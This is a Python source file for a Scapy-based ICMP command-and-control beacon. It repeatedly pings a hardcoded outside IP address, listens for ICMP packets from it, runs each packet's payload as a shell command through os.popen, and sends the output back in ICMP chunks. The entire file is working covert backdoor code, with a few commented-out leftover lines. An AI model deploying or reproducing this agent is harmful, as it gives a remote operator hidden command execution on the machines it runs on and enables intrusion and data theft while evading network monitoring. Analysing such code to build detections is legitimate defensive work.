"""
ICMP C2 Beacon Client (Scapy-based)

- Periodically sends ICMP Echo Request (type 8) packets to a hardcoded server IP.
- Listens for incoming ICMP packets containing commands in the payload.
- Executes received commands and sends back the results via ICMP Echo Reply packets in chunks.

Acts as a covert command-and-control (C2) agent using ICMP protocol for communication.
"""


import os
from itertools import count
from datetime import datetime, timedelta

from scapy.all import *
from scapy.layers.inet import IP, ICMP

server_ip = "35.238.133.54"

def handler(pkt):
        if Raw in pkt:
            var = pkt[Raw].load.decode()

            # Execute command and retrieve result
            res = os.popen(var).read()

            # Send results back in chunks
            chunks = [res[i:i + 500] for i in range(0, len(res), 500)]
            for chunk in chunks:
                send(IP(dst=server_ip) / ICMP(type="echo-reply", id=0x0001, seq=0x1) / Raw(load=chunk))

        
def main():

    #rx = IP(dst=s_ip) / ICMP(type=8, id=0x0001, seq=1)
    #print(f"sending packet {rx}")
    #send(rx)

    while True:
        """ Send frequent notices to server """
      #  3reference_time = datetime.now()
    #if datetime.now() - reference_time >= timedelta(seconds=30):
        send(IP(dst=server_ip)/ICMP(type=8, id=0x0001, seq=0x1))

        """ Wait for the command to be received """
        print(f"sniffing")
        sniff(filter=f"icmp and icmp[0] == 8 and host {server_ip}", timeout=30, prn=handler)

        #  sniff(filter=f"icmp and host {s_ip}", timeout=30, prn=handler)
        """ Extract the payload """






if __name__ == "__main__":
    main()